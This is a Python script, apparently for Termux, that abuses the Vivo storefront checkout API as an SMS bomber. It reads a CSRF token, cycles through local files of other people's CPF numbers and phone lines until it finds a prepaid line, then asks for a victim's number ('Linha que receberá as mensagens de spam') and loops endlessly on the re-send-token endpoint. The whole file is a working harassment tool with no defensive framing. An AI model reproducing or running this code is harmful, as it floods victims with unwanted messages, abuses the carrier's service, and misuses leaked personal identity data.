#!/data/data/com.termux/files/usr/bin/python

import json
import re
import os
import random
from glob import glob

import patches
from http_clients import api
from regex import csrftoken, phone
from settings import dados

param = {
	'plan': 'VIVOCTRLF77N'
}

request = api.get('/vivostorefront/checkout-express', params=param)

try:
	token = csrftoken.search(request.text).group(1)
except AttributeError:
	raise ValueError('Não foi possível obter o token CSRF')

json_files = glob(os.path.join(dados, '*'))

while True:
	
	random_file = random.choice(json_files)
	
	content = open(random_file, 'r').read()
	content_dict = json.loads(content)
	
	data = {
		'planCode': 'VIVOCTRLF77N',
		'document': content_dict['data']['cpf'],
		'phone': content_dict['data']['linha'],
		'CSRFToken': token
	}
	
	request = api.post('/vivostorefront/checkout-express/validateLine', data=data)
	json_response = request.json()
	
	try:
		if json_response['currentPlatform'] == 'PREPAGO':
			break
	except KeyError:
		pass

data.update({
	'phone': input('Linha que receberá as mensagens de spam: ')
})

if not phone.match(data['phone']):
	raise ValueError('Número de telefone inválido')

total = 0

while True:
	try:
		response = api.post('/vivostorefront/checkout-express/re-send-token', data=data, timeout=1.5)
		json_response = response.json()
		if 'success' in json_response:
			total = total + 1
			print(f'1 SMS enviado. Total: {total}')
	except KeyboardInterrupt:
		quit()
	except:
		pass
